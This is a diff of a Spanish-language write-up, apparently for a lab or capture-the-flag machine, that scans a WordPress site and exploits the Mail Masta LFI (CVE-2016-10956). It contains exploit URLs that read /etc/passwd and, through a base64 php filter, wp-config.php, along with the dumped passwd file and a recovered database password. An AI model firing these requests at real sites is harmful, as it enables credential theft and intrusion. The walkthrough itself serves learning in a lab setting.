@@ -41,7 +41,7 @@ IP ID Sequence Generation: All zeros
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-##  Escaneo WPScan de WordPress
+## Escaneo WPScan de WordPress
 
 Escaneo de seguridad del sitio WordPress alojado en el puerto 7664, identificando la versión 7.0.1 del CMS con el tema twentytwentyfive. Se detectan endpoints sensibles como XML-RPC habilitado, readme.html y wp-cron.php accesibles. El plugin Akismet 5.7 se encuentra instalado, pero lo más relevante es el plugin Mail Masta 1.0, ubicado en /wp-content/plugins/mail-masta/, el cual presenta un historial de vulnerabilidades conocidas que podrían ser explotadas para obtener acceso al sistema.
 
@@ -163,14 +163,17 @@ Interesting Finding(s):
 [+] Elapsed time: 00:02:55
 ```
 
-MAIL-MASTA vulnerabildiad CVE-2016-10956
+## Explotación de LFI en Mail Masta y Enumeración de Configuración
 
-Se saca el usuario
+Explotación de la vulnerabilidad CVE-2016-10956 en el plugin Mail Masta mediante un Local File Inclusion (LFI) en el archivo /inc/campaign/count_of_send.php con el parámetro pl. Se utiliza primero para leer el archivo /etc/passwd y enumerar los usuarios del sistema, confirmando la existencia de haber_fritz y clara_immerwahr. Posteriormente, se emplea el mismo vector para leer wp-config.php mediante un filtro base64 que evita la ejecución del código PHP, decodificando el contenido para obtener las credenciales de la base de datos WordPress, incluyendo la contraseña 9/12/!1868_Br3sl$a5ia!, que coincide con la del usuario haber_fritz debido a la reutilización de credenciales.
 
-http://IP:7664/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+### Enumeración de Usuarios del Sistema
 
 ```bash
-root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:104::/nonexistent:/usr/sbin/nologin systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin pollinate:x:105:1::/var/cache/pollinate:/bin/false syslog:x:106:113::/home/syslog:/usr/sbin/nologin uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin tss:x:109:116:TPM software stack,,,:/var/lib/tpm:/bin/false landscape:x:110:117::/var/lib/landscape:/usr/sbin/nologin fwupd-refresh:x:111:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:113:65534::/run/sshd:/usr/sbin/nologin haber_fritz:x:1000:1000:Fritz Haber:/home/haber_fritz:/bin/bash lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false 
+http://IP:7664/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+```
+```bash
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:104::/nonexistent:/usr/sbin/nologin systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin pollinate:x:105:1::/var/cache/pollinate:/bin/false syslog:x:106:113::/home/syslog:/usr/sbin/nologin uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin tss:x:109:116:TPM software stack,,,:/var/lib/tpm:/bin/false landscape:x:110:117::/var/lib/landscape:/usr/sbin/nologin fwupd-refresh:x:111:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:113:65534::/run/sshd:/usr/sbin/nologin haber_fritz:x:1000:1000:Fritz Haber:/home/haber_fritz:/bin/bash lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false clara_immerwahr:x:1001:1001:Clara Immerwahr,,,:/home/clara_immerwahr:/bin/bash 
 ```
 
 http://192.168.184.140:7664/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php
